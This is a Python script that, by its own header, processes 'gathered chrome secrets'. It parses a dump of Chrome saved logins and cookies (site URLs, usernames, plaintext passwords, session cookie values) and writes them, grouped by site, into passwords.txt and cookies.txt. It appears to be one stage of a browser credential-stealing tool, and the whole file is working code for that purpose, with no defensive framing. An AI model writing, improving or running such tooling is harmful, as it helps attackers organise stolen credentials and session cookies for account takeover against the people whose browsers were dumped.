# @author 
# Demangle gathered chrome secrets into two files: passwords.txt and cookies.txt

import json 
import pprint

cookies_out = 'cookies.txt'
passwords_out = 'password.txt'

pp = pprint.PrettyPrinter(indent=4)

stack = 0 
passwords = {}
cookies = {}

with open("chrome_secrets.txt", "r") as secin:
    lines = secin.read().split('\n')
    i = 0
    while(i < len(lines)):
        if lines[i].strip() == '{' :
            i += 1 
            continue
        if lines[i].strip() == '}' :
            i += 1
            continue
        if "action_url: " in lines[i]:
            url = lines[i].split("action_url: ")[1].strip() # url has no spaces
            if url not in passwords:
                passwords[url] = []
            i += 1 # uname
            username = lines[i].split('username_value: ')[1]
            i+= 1 # pass
            password = lines[i].split('password_value: ')[1]
            passwords[url].append( (username, password) )
            i += 1
            continue
        if "host_key: " in lines[i]:
            host = lines[i].split("host_key: ")[1]
            i += 1 # path
            path = lines[i].split("path: ")[1]
            i += 1 # name
            name = lines[i].split("name: ")[1]
            i += 1 # value/cookie
            value = lines[i].split("cookies: ")[1]
            host += path
            if host not in cookies:
                cookies[host] = []
                cookies[host].append((name, value))
            else:
                cookies[host].append((name,value))
            i+=1
            continue
        i +=1

#pp.pprint(len(passwords[url]))
#pp.pprint(cookies)
pretty_passwd_template = "\t{\n\t\t%s: %s\n\t\t%s: %s\n\t\t%s: %s\n\t}\n"
with open(passwords_out, "w") as pout:
    for url in passwords:
        pout.write(url + ":\n{\n")
        for t in passwords[url]:
            pout.write("\tusername: %s\n\tpassword: %s\n\n" % (t[0], t[1]))
        pout.write("}\n")

with open(cookies_out, "w") as cout:
    for host in cookies:
        cout.write('\n' + host + ":\n{\n")
        jsonline = "\t%s : %s,\n"
        oul = ""
        for t in cookies[host]:
            oul += jsonline % (t[0], t[1])
        oul = oul[:-2]
        cout.write(oul + "\n\n}\n")
